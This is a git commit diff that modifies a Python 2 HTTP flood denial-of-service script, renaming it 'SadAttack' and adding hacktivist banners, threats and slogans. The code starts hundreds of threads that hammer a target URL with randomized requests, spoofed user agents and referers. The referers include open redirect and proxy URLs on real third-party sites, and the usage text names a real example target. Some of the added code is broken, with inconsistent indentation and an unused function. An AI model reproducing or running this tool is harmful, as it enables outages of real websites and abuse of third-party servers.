3afed85fe88fe4d6788637306a52029768b1711d
Makara <152614418+soreungmakara2@users.noreply.github.com>
2024-04-05 07:51:36 +0700

    Update python3 m60.py

--- python3 m60.py
+++ python3 m60.py
@@ -1,21 +1,32 @@
+####################################->
+#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
+#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
+#5afc3c0f68ff47b53b485fcd53e898a9######---->Anonymous :(
+#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
+#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
+####################################->
+#https://www.youtube.com/watch?v=Aps4ZczffVw#
+#Allahu Akbar!#
+
+
 import urllib2
 import sys
 import threading
 import random
 import re
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+#global params                                                                                       
+url=''                                                                                              ###############################
+host=''                                                                                             #~~~~Created By Hax Stroke~~~~#
+headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
+headers_referers=[]                                                                                 #fb.com/anonghostsoldierstroke#
+request_counter=0                                                                                   #~~~youtube.com/c/HaXStroKE~~~#
+flag=0                                                                                              #~~~~~Twitter:@HaxStroKE~~~~~~#
+safe=0                                                                                              ###############################
 
 def inc_counter():
 	global request_counter
-	request_counter+=1
+	request_counter+=45
 
 def set_flag(val):
 	global flag
@@ -28,11 +39,11 @@ def set_safe():
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
@@ -45,9 +56,112 @@ def useragent_list():
 # generates a referer array
 def referer_list():
 	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://www.google.com/?q=')                                       ############################
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
+	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
+	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
+	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
+	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
+	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
+	headers_referers.append('http://www.ask.com/web?q=')
+	headers_referers.append('http://search.lycos.com/web/?q=')
+	headers_referers.append('http://busca.uol.com.br/web/?q=')
+	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
+	headers_referers.append('http://www.dmoz.org/search/search?q=')
+	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
+	headers_referers.append('http://yandex.ru/yandsearch?text=')
+	headers_referers.append('http://www.zhongsou.com/third?w=')
+	headers_referers.append('http://hksearch.timway.com/search.php?query=')
+	headers_referers.append('http://find.ezilon.com/search.php?q=')
+	headers_referers.append('http://www.sogou.com/web?query=')
+	headers_referers.append('http://api.duckduckgo.com/html/?q=')
+	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
+        headers_referers.append('http://validator.w3.org/check?uri=')
+        headers_referers.append('http://validator.w3.org/checklink?uri=')
+        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
+        headers_referers.append('http://validator.w3.org/nu/?doc=')
+        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
+        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
+        headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
+	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
+	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
+	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
+	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
+	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
+	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
+	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
+	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
+	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
+	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
+	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
+	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
+	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
+	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
+	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
+	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
+	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
+	headers_referers.append('http://evoec.com/review/redirect.php?url=')
+	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
+	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
+	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
+	headers_referers.append('http://apke.ru/redirect.php?url=')
+	headers_referers.append('http://seodrum.com/redirect.php?url=')
+	headers_referers.append('http://redrool.com/redirect.php?url=')
+	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
+	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
+	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
+	headers_referers.append('http://searchtoday.info/redirect.php?url=')
+	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
+	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
+	headers_referers.append('http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=')
+	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
+	headers_referers.append('http://www.e39-forum.de/redir.php?url=')
+	headers_referers.append('http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=')
+	headers_referers.append('http://www.selectsmart.com/plus/select.php?url=')
+	headers_referers.append('http://www.taichinh2a.com/forum/links.php?url=')
+	headers_referers.append('http://facenama.com/go.php?url=')
+	headers_referers.append('http://www.internet-abc.de/eltern/118732.php?url=')
+	headers_referers.append('http://g.makebd.com/index.php?url=')
+	headers_referers.append('https://blog.eduzones.com/redirect.php?url=')
+	headers_referers.append('http://www.mientay24h.vn/redirector.php?url=')
+	headers_referers.append('http://www.kapook.com/webout.php?url=')
+	headers_referers.append('http://lue4.ddns.name/pk/index.php?url=')
+	headers_referers.append('http://747.ddns.ms/pk/index.php?url=')
+	headers_referers.append('http://737.ddns.us/pk/index.php?url=')
+	headers_referers.append('http://a30.m1.4irc.com/pk/index.php?url=')
+
+# generates a Keyword list	
+def keyword_list():
+        global keyword_top
+        keyword_top.append('HaxStroke')
+        keyword_top.append('Suicide')
+        keyword_top.append('Sex')
+        keyword_top.append('Robin Williams')
+        keyword_top.append('World Cup')
+        keyword_top.append('Ca Si Le Roi')
+        keyword_top.append('Ebola')
+        keyword_top.append('Malaysia Airlines Flight 370')
+        keyword_top.append('ALS Ice Bucket Challenge')
+        keyword_top.append('Flappy Bird')
+        keyword_top.append('Conchita Wurst')
+        keyword_top.append('ISIS')
+        keyword_top.append('Frozen')
+        keyword_top.append('014 Sochi Winter Olympics')
+        keyword_top.append('IPhone')
+        keyword_top.append('Samsung Galaxy S5')
+        keyword_top.append('Nexus 6')
+        keyword_top.append('Moto G')
+        keyword_top.append('Samsung Note 4')
+        keyword_top.append('LG G3')
+        keyword_top.append('Xbox One')
+        keyword_top.append('Apple Watch')
+        keyword_top.append('Nokia X')
+        keyword_top.append('Ipad Air')
+        keyword_top.append('Facebook')
+        keyword_top.append('Anonymous')
+        keyword_top.append('DJ Bach')
+
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
@@ -55,40 +169,55 @@ def referer_list():
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(65, 160)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python m60.py <url>'
-	print 'The m60 was one governamental ddos the distribuition of this is limited Created by : Hax Stroke'
+	print 'SadAttack Version 2.0 DDoS Tool Created By Hax Stroke and moddified by Akira '
+	print 'AnonGhost Team Page: http://facebook.com/anonghost.sec'
+	print 'New loaded Botnets: 39,445,657'
+	print 'Usage: botnet_akira (url)'
+	print 'Example: botnet_akira http://luthi.co.il/'
 	print "\a"
 print \
-"""            _________
-            /'        /|
-           /         / |_
-          /         /  //|
-         /_________/  ////|
-        |   _ _    | 8o////|
-        | /'// )_  |   8///|
-        |/ // // ) |   8o///|
-        / // // //,|  /  8//|
-       / // // /// | /   8//|
-      / // // ///__|/    8//|
-     /.(_)// /// |       8///|
-    (_)' `(_)//| |       8////|___________
-   (_) /_\ (_)'| |        8///////////////
-   (_) \"/ (_)'|_|         8/////////////
-    (_)._.(_) d' Hb         8oooooooopb'
-      `(_)'  d'  H`b
-            d'   `b`b
-           d'     H `b
-          d'      `b `b
-         d'           `b
-        d'             `b  
+"""                                                       
+                                  ###################
+                              ###!!!!!!!!!!!!!!!!!!!####
+                          ###!!!!!!!!!!!!!!!!!!!!!!!!!####
+                        ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###     
+                     ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###
+                   ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###       
+                  ##!!!!!!!!!#####!!!!!!!!!!!#####!!!!!!!!!##       
+                ##!!!!!!!!!!######!!!!!!!!!!######!!!!!!!!!##       
+               ##!!!!!!!!!!!####!!!!!!!!!!!!####!!!!!!!!!!!##       
+              ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##       
+             ##!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
+            ##!!!!!!!!!!!!!!!!!!!!####!!!!!!!!!!!!!!!!!!!!##
+           ##!!!!!!!!!!!!!!!###############!!!!!!!!!!!!!!##
+           ##!!!!!!!!!!!!####!!!!!!!!!!!#####!!!!!!!!!!!##
+          ###!!!!!!!!!###!!!!!!!!!!!!!!!!!!##!!!!!!!!!!##
+          ##!!!!!!!!!#!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!!##
+          ###!!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!!!##
+          ###!!!!!#!!!!!!!!!!!!!!!!!!!!!!!!!##!!!!!##
+           ###!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!##
+            ###!!!!!!!!!!!!!!!!!!!!!HAHA!!WEAREHERE##
+             ###!!!!!!!!!!!!!!Anonymous!Team##
+              ####!!!!!!!!!!!!!SadAttacK###
+                ####!!!!!!!!!!!!!!!!!###
+                   ################# 
+_________________________________________________________________
+
+  ################## Smoking loud I'm a lonely cloud
+  #SadBoys 2001    # I'm a lonely cloud, with my windows down
+  #Yoshi city      # I'm a lonely, lonely, I'm a lonely, lonely
+  #Akira botnet    # I'm a lonely, lonely, I'm a lonely, lonely
+  #Add Sites       # I'm a lonely, lonely, I'm a lonely, lonely
+  ################## I'm a lonely, lonely, I'm a lonely, lonely
+
+  Music : https://www.youtube.com/watch?v=iX1a3JngmpI   
+_________________________________________________________________                                                           
 """
-print '---------------------------------------------------'
 
 	
 #http request
@@ -104,8 +233,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,160))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -113,7 +242,12 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'm60 Was Shotting All protection fo the server'
+ 			print '                                                                    '
+ 			print '#~~~~~~~> We Are Anonymous <~~~~~~~~#~~~>We Come For Opicarus<~~#'
+ 			print '#~~~~~~> Killuminati <~~~~~#~~~~~~~~~>Hello Banks<~~~~~~~~#'
+ 			print '#~~~~~~> Freedom <~~~~~~~#~~~~>You R Our Target<~~~~#'
+ 			print '#~~~> WATCH THIS <~~~#~~~>DDOS<~~~#'
+ 			print '                                                                    '
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -140,11 +274,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Shots sends Senting" % (request_counter)
+			if (previous+150<request_counter) & (previous<>request_counter):
+				print "#~~~>ATTACK THE INTERNET: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n -M60 Hits are secced"
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
 #execute 
 if len(sys.argv) < 2:
@@ -155,7 +289,9 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Ak 47 attack was been sended This tool is created by : Russian Hackers"
+		print "Starting the Sadness in webserver Sad DDoS Tool"
+		print "Created By Anonymous"
+		print "Moddified By Akira"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -164,8 +300,16 @@ else:
 			url = url + "/"
 		m = re.search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
-		for i in range(500):
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
+
+####################################->
+#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
+#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
+#5afc3c0f68ff47b53b485fcd53e898a9######---->SadAttack :(
+#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
+#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->uRDead
+####################################->ANONYMOUS
